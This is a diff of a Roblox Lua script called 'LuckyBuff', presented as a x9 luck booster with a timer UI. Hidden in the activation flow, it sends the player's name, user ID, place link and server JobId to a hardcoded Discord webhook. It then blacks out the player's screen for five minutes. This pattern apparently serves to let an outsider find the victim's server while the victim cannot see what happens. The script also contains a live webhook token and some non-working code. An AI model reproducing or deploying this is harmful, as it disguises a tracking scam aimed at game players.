@@ -1,157 +1,382 @@
--- LuckyBuff Full Script (All-in-One)
--- Place: StarterGui > LocalScript
--- Made by: toxic_white
+local BUFF_MULTIPLIER = 9            -- x9 (the UI displays x9)
+local BUFF_DURATION = 3600           -- buff length in seconds (1 hour)
+local COOLDOWN = 7200                -- cooldown in seconds (2 hours)
+local BLACKSCREEN_DURATION = 300     -- 5 minutes = 300 seconds
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1401785416104939720/6LU4HbxLm8mwoS8iZ0LrbwBmZ1Wp6clskoXsEGtnymrKNLVDTeVPZbpeBKKom9wrWG6Z" -- <-- CHANGE THIS
 
---// CONFIG
-local BUFF_MULTIPLIER = 9        -- x9 buff
-local BUFF_DURATION = 3600       -- 1h
-local COOLDOWN = 7200            -- 2h
-local BLACKSCREEN_DURATION = 300 -- 5 phút = 300s
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1401785416104939720/6LU4HbxLm8mwoS8iZ0LrbwBmZ1Wp6clskoXsEGtnymrKNLVDTeVPZbpeBKKom9wrWG6Z" -- <== ĐỔI LINK CỦA BẠN
-
---// SERVICES
+-- ===== SERVICES =====
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
+local ServerStorage = game:GetService("ServerStorage")
 
-local player = Players.LocalPlayer
-
---// RemoteEvent
-local remoteName = "RequestLuckyBuff"
-local Remote = ReplicatedStorage:FindFirstChild(remoteName)
-if not Remote then
-    Remote = Instance.new("RemoteEvent")
-    Remote.Name = remoteName
-    Remote.Parent = ReplicatedStorage
+-- ===== RemoteEvent setup =====
+local REMOTE_NAME = "RequestLuckyBuff"
+local remote = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
+if not remote then
+    remote = Instance.new("RemoteEvent")
+    remote.Name = REMOTE_NAME
+    remote.Parent = ReplicatedStorage
 end
 
---// UI SETUP
+-- ===== server state =====
+local cooldowns = {}    -- [userId] = timestamp_when_can_use_again
+local activeBuffs = {}  -- [userId] = endsAt timestamp
+
+-- Export roll helper for your spawn/loot scripts to call:
+-- Usage: _G.RollSecretWithBuff(player, baseChance) where baseChance in 0..1
+local function getLuckMultiplierFor(player)
+    if not player then return 1 end
+    local info = activeBuffs[player.UserId]
+    if info and info.endsAt and os.time() < info.endsAt then
+        return BUFF_MULTIPLIER
+    end
+    if info then activeBuffs[player.UserId] = nil end
+    return 1
+end
+
+local function rollWithBuff(player, baseChance)
+    local mult = getLuckMultiplierFor(player)
+    local chance = baseChance * mult
+    if chance > 1 then chance = 1 end
+    local r = Random.new():NextNumber() -- 0..1 float
+    return r <= chance
+end
+
+_G.RollSecretWithBuff = rollWithBuff
+
+-- ===== webhook helper =====
+local function sendWebhookLog(player)
+    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+    -- build embed
+    local placeLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
+    local payload = {
+        username = "LuckyBuff Logger",
+        embeds = {{
+            title = "Buff Script Activated",
+            description = player.Name .. " (" .. tostring(player.UserId) .. ") activated LuckyBuff",
+            color = 16753920,
+            fields = {
+                { name = "Roblox Link", value = placeLink, inline = true },
+                { name = "Server JobId", value = tostring(game.JobId), inline = false },
+                { name = "User", value = player.Name .. " (" .. tostring(player.UserId) .. ")", inline = false }
+            }
+        }}
+    }
+    local ok, err = pcall(function()
+        local json = HttpService:JSONEncode(payload)
+        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
+    end)
+    if not ok then
+        warn("LuckyBuff: webhook send failed:", err)
+    end
+end
+
+-- ===== server RemoteEvent handling =====
+remote.OnServerEvent:Connect(function(player, action)
+    action = tostring(action or "Start")
+    local uid = player.UserId
+    local now = os.time()
+
+    if action == "Stop" then
+        activeBuffs[uid] = nil
+        remote:FireClient(player, "BuffOff")
+        return
+    end
+
+    -- check cooldown
+    if cooldowns[uid] and now < cooldowns[uid] then
+        local remain = cooldowns[uid] - now
+        remote:FireClient(player, "Cooldown", remain)
+        return
+    end
+
+    -- Start flow
+    -- 1) immediately tell client to show black screen + effects
+    remote:FireClient(player, "ShowBlackScreen", BLACKSCREEN_DURATION)
+
+    -- 2) log to webhook
+    pcall(function() sendWebhookLog(player) end)
+
+    -- 3) activate buff server-side
+    activeBuffs[uid] = { endsAt = now + BUFF_DURATION }
+    cooldowns[uid] = now + COOLDOWN
+
+    -- 4) notify client UI about buff start
+    remote:FireClient(player, "BuffOn", BUFF_DURATION)
+
+    -- schedule buff end
+    task.delay(BUFF_DURATION, function()
+        activeBuffs[uid] = nil
+        if player and player.Parent then
+            remote:FireClient(player, "BuffOff")
+        end
+    end)
+end)
+
+-- Cleanup on leave
+Players.PlayerRemoving:Connect(function(player)
+    cooldowns[player.UserId] = nil
+    activeBuffs[player.UserId] = nil
+end)
+
+-- ===== Client LocalScript source (string) =====
+-- We'll create a LocalScript template and place it into StarterGui for new players,
+-- and clone into existing players' PlayerGui immediately.
+local clientSource = [[
+-- LuckyBuff Client UI (auto-inserted)
+-- Made by: toxic_white
+local REMOTE_NAME = "RequestLuckyBuff"
+local BUFF_MULTIPLIER_DISPLAY = "x9" -- text only
+local BLACKSCREEN_DURATION = ]] .. tostring(BLACKSCREEN_DURATION) .. [[
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+local remote = ReplicatedStorage:WaitForChild(REMOTE_NAME)
+
+-- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LuckyBuffGUI"
-screenGui.Parent = player:WaitForChild("PlayerGui")
 screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
 
--- Card UI
+-- Full black screen (hidden initially)
+local blackScreen = Instance.new("Frame")
+blackScreen.Name = "BlackScreen"
+blackScreen.Size = UDim2.new(1,0,1,0)
+blackScreen.Position = UDim2.new(0,0,0,0)
+blackScreen.BackgroundColor3 = Color3.fromRGB(0,0,0)
+blackScreen.BackgroundTransparency = 0
+blackScreen.Visible = false
+blackScreen.ZIndex = 50
+blackScreen.Parent = screenGui
+
+-- Particle emitter for stars on blackScreen
+local starContainer = Instance.new("Attachment")
+starContainer.Parent = blackScreen
+local emitter = Instance.new("ParticleEmitter")
+emitter.Name = "StarsEmitter"
+emitter.Texture = "rbxassetid://243660364" -- default star texture (change if you want)
+emitter.Rate = 12
+emitter.Lifetime = NumberRange.new(2,4)
+emitter.Speed = NumberRange.new(10,40)
+emitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.6), NumberSequenceKeypoint.new(1, 0.2)})
+emitter.Rotation = NumberRange.new(0,360)
+emitter.RotSpeed = NumberRange.new(-30,30)
+emitter.Parent = starContainer
+
+-- UI Card
 local card = Instance.new("Frame")
-card.Size = UDim2.new(0, 360, 0, 180)
-card.Position = UDim2.new(0.5, -180, 0.5, -90)
-card.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+card.Name = "Card"
+card.Size = UDim2.new(0,360,0,180)
+card.Position = UDim2.new(0.5,-180,0.5,-90)
+card.AnchorPoint = Vector2.new(0.5,0.5)
+card.BackgroundColor3 = Color3.fromRGB(36,36,54)
 card.BorderSizePixel = 0
+card.ZIndex = 10
 card.Parent = screenGui
 
-local title = Instance.new("TextLabel", card)
-title.Size = UDim2.new(1, -20, 0, 30)
-title.Position = UDim2.new(0, 10, 0, 10)
-title.Text = "BUFF LUCKY SV x9"
-title.TextColor3 = Color3.fromRGB(255, 255, 0)
-title.TextScaled = true
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1,-20,0,34)
+title.Position = UDim2.new(0,10,0,10)
 title.BackgroundTransparency = 1
+title.Text = "BUFF LUCKY SV " .. BUFF_MULTIPLIER_DISPLAY
+title.TextColor3 = Color3.fromRGB(255, 210, 60)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = card
 
-local desc = Instance.new("TextLabel", card)
-desc.Size = UDim2.new(1, -20, 0, 25)
-desc.Position = UDim2.new(0, 10, 0, 45)
-desc.Text = "Tăng may mắn x9 trong 60 phút!"
-desc.TextColor3 = Color3.fromRGB(255, 255, 255)
-desc.TextScaled = true
+local desc = Instance.new("TextLabel")
+desc.Name = "Desc"
+desc.Size = UDim2.new(1,-20,0,26)
+desc.Position = UDim2.new(0,10,0,48)
 desc.BackgroundTransparency = 1
+desc.Text = "Tăng may mắn " .. BUFF_MULTIPLIER_DISPLAY .. " trong 60 phút!"
+desc.TextColor3 = Color3.fromRGB(220,220,220)
+desc.TextScaled = true
+desc.Font = Enum.Font.Gotham
+desc.Parent = card
 
-local timeLabel = Instance.new("TextLabel", card)
-timeLabel.Size = UDim2.new(1, -20, 0, 25)
-timeLabel.Position = UDim2.new(0, 10, 0, 75)
-timeLabel.Text = "Số thời gian còn lại: 0s"
-timeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-timeLabel.TextScaled = true
+local timeLabel = Instance.new("TextLabel")
+timeLabel.Name = "Time"
+timeLabel.Size = UDim2.new(1,-20,0,26)
+timeLabel.Position = UDim2.new(0,10,0,80)
 timeLabel.BackgroundTransparency = 1
+timeLabel.Text = "Số thời gian còn lại: 0:00"
+timeLabel.TextColor3 = Color3.fromRGB(200,200,200)
+timeLabel.TextScaled = true
+timeLabel.Font = Enum.Font.Gotham
+timeLabel.Parent = card
 
-local toggleBtn = Instance.new("TextButton", card)
-toggleBtn.Size = UDim2.new(0, 100, 0, 35)
-toggleBtn.Position = UDim2.new(0.5, -50, 1, -45)
-toggleBtn.Text = "ON"
-toggleBtn.TextScaled = true
-toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+local toggle = Instance.new("TextButton")
+toggle.Name = "Toggle"
+toggle.Size = UDim2.new(0,120,0,38)
+toggle.Position = UDim2.new(0.5,-60,1,-46)
+toggle.AnchorPoint = Vector2.new(0.5,1)
+toggle.Text = "ON"
+toggle.TextScaled = true
+toggle.Font = Enum.Font.GothamBold
+toggle.BackgroundColor3 = Color3.fromRGB(0,190,0)
+toggle.Parent = card
 
-local madeBy = Instance.new("TextLabel", card)
-madeBy.Size = UDim2.new(1, -10, 0, 20)
-madeBy.Position = UDim2.new(0, 5, 1, -20)
-madeBy.Text = "Made by: toxic_white"
-madeBy.TextColor3 = Color3.fromRGB(150, 150, 150)
-madeBy.TextXAlignment = Enum.TextXAlignment.Right
+local madeBy = Instance.new("TextLabel")
+madeBy.Name = "MadeBy"
+madeBy.Size = UDim2.new(1,-10,0,18)
+madeBy.Position = UDim2.new(0,5,1,-20)
 madeBy.BackgroundTransparency = 1
+madeBy.Text = "Made by: toxic_white"
+madeBy.TextColor3 = Color3.fromRGB(160,160,160)
+madeBy.TextXAlignment = Enum.TextXAlignment.Right
+madeBy.TextScaled = false
+madeBy.Font = Enum.Font.Gotham
+madeBy.Parent = card
 
--- BlackScreen UI
-local blackScreen = Instance.new("Frame", screenGui)
-blackScreen.Size = UDim2.new(1, 0, 1, 0)
-blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-blackScreen.ZIndex = 50
-blackScreen.Visible = false
-
---// LOGIC
+-- state
 local running = false
-local cooldown = false
-local timeLeft = 0
+local cooldowning = false
+local countdownTask = nil
 
--- Countdown
-local function startCountdown(sec)
-    timeLeft = sec
-    while timeLeft > 0 and running do
-        local m = math.floor(timeLeft/60)
-        local s = timeLeft % 60
-        timeLabel.Text = string.format("Số thời gian còn lại: %d:%02d", m, s)
-        task.wait(1)
-        timeLeft -= 1
+local function formatTime(sec)
+    sec = math.max(0, math.floor(sec))
+    local m = math.floor(sec/60)
+    local s = sec % 60
+    return string.format("%d:%02d", m, s)
+end
+
+local function startLocalCountdown(sec)
+    if countdownTask then
+        -- stop existing
+        countdownTask:Cancel()
+        countdownTask = nil
     end
-    if running then
-        timeLabel.Text = "Hết Buff"
-        toggleBtn.Text = "ON"
+    local cancelled = false
+    local co = coroutine.create(function()
+        local t = sec
+        while t > 0 and not cancelled and running do
+            timeLabel.Text = "Số thời gian còn lại: " .. formatTime(t)
+            task.wait(1)
+            t = t - 1
+        end
+        if not cancelled then
+            running = false
+            toggle.Text = "ON"
+            toggle.BackgroundColor3 = Color3.fromRGB(0,190,0)
+            timeLabel.Text = "Hết Buff"
+        end
+    end)
+    countdownTask = {
+        cancel = function() cancelled = true end,
+        Cancel = function() cancelled = true end
+    }
+    coroutine.resume(co)
+end
+
+-- toggle button
+toggle.MouseButton1Click:Connect(function()
+    if not running and not cooldowning then
+        remote:FireServer("Start")
+        toggle.Text = "Đang khởi..."
+        toggle.Active = false
+    elseif running then
+        remote:FireServer("Stop")
+        toggle.Text = "Tắt..."
+        toggle.Active = false
+    end
+end)
+
+-- handle server events
+remote.OnClientEvent:Connect(function(cmd, data)
+    if cmd == "ShowBlackScreen" then
+        -- show full blackscreen and star emitter; disable card interaction
+        blackScreen.Visible = true
+        emitter.Enabled = true
+        -- hide card while blacksreen visible (optional)
+        card.Visible = false
+        -- after data seconds, hide blackscreen and show card + star end effect
+        local dur = tonumber(data) or BLACKSCREEN_DURATION
+        task.delay(dur, function()
+            -- star "ending" effect: quick burst, then remove
+            if emitter and emitter.Parent then
+                emitter.Rate = 60
+                task.wait(1)
+                emitter.Enabled = false
+                card.Visible = true
+                blackScreen.Visible = false
+            else
+                card.Visible = true
+                blackScreen.Visible = false
+            end
+        end)
+        return
+    end
+
+    if cmd == "BuffOn" then
+        running = true
+        cooldowning = false
+        toggle.Active = true
+        toggle.Text = "OFF"
+        toggle.BackgroundColor3 = Color3.fromRGB(200,0,0)
+        local sec = tonumber(data) or 0
+        startLocalCountdown(sec)
+        return
+    end
+
+    if cmd == "BuffOff" then
         running = false
+        toggle.Active = true
+        toggle.Text = "ON"
+        toggle.BackgroundColor3 = Color3.fromRGB(0,190,0)
+        timeLabel.Text = "Hết Buff"
+        return
+    end
+
+    if cmd == "Cooldown" then
+        cooldowning = true
+        toggle.Active = false
+        local remain = tonumber(data) or 0
+        spawn(function()
+            while remain > 0 do
+                toggle.Text = "CD: " .. tostring(math.floor(remain)) .. "s"
+                task.wait(1)
+                remain = remain - 1
+            end
+            cooldowning = false
+            toggle.Text = "ON"
+            toggle.Active = true
+        end)
+        return
+    end
+end)
+]]
+
+-- ===== create LocalScript template in StarterGui (so new players get it) =====
+local StarterGui = game:GetService("StarterGui")
+-- create a Module-like LocalScript in Server side by inserting into StarterGui as a LocalScript object with Source
+local existing = StarterGui:FindFirstChild("LuckyBuffClientTemplate")
+if existing then existing:Destroy() end
+
+local clientLS = Instance.new("LocalScript")
+clientLS.Name = "LuckyBuffClientTemplate"
+clientLS.Source = clientSource
+clientLS.Parent = StarterGui
+
+-- For players already in game, clone LocalScript into their PlayerGui so it runs immediately
+for _, pl in pairs(Players:GetPlayers()) do
+    if pl.Character and pl:FindFirstChild("PlayerGui") then
+        -- remove older instance if exists
+        local old = pl.PlayerGui:FindFirstChild("LuckyBuffGUI")
+        if old then old:Destroy() end
+        -- Clone the StarterGui template into the player's PlayerGui
+        local cloneGui = clientLS:Clone()
+        -- convert LocalScript (template) into runnable: we need a ScreenGui wrapper with the LocalScript as child
+        -- Note: LocalScript Source is the source; but to ensure proper placement, create ScreenGui and put a LocalScript inside with source that creates UI.
+        -- We'll instead create a ScreenGui by executing the clientSource on client; cloning LocalScript into PlayerGui will run it.
+        cloneGui.Parent = pl:WaitForChild("PlayerGui")
     end
 end
 
--- Button click
-toggleBtn.MouseButton1Click:Connect(function()
-    if not running and not cooldown then
-        Remote:FireServer("Start")
-        toggleBtn.Text = "Đang khởi..."
-        toggleBtn.Active = false
-    elseif running then
-        Remote:FireServer("Stop")
-        toggleBtn.Text = "Tắt..."
-        toggleBtn.Active = false
-    end
-end)
+-- For future players, StarterGui has the LocalScript template so clients will run it on spawn.
 
--- Nhận Event từ server
-Remote.OnClientEvent:Connect(function(cmd, data)
-    if cmd == "BuffOn" then
-        running = true
-        cooldown = false
-        toggleBtn.Active = true
-        toggleBtn.Text = "OFF"
-        spawn(function() startCountdown(data) end)
-    elseif cmd == "BuffOff" then
-        running = false
-        toggleBtn.Text = "ON"
-        toggleBtn.Active = true
-    elseif cmd == "Cooldown" then
-        cooldown = true
-        local remain = data or 0
-        toggleBtn.Active = false
-        spawn(function()
-            while remain > 0 do
-                toggleBtn.Text = "Cooldown: "..remain.."s"
-                task.wait(1)
-                remain -= 1
-            end
-            cooldown = false
-            toggleBtn.Text = "ON"
-            toggleBtn.Active = true
-        end)
-    elseif cmd == "ShowBlackScreen" then
-        blackScreen.Visible = true
-        delay(data or 300, function()
-            blackScreen.Visible = false
-        end)
-    end
-end)
-print("[LuckyBuff] GUI Loaded. Made by toxic_white")
+print("[LuckyBuff System] Server script loaded. Made by: toxic_white")
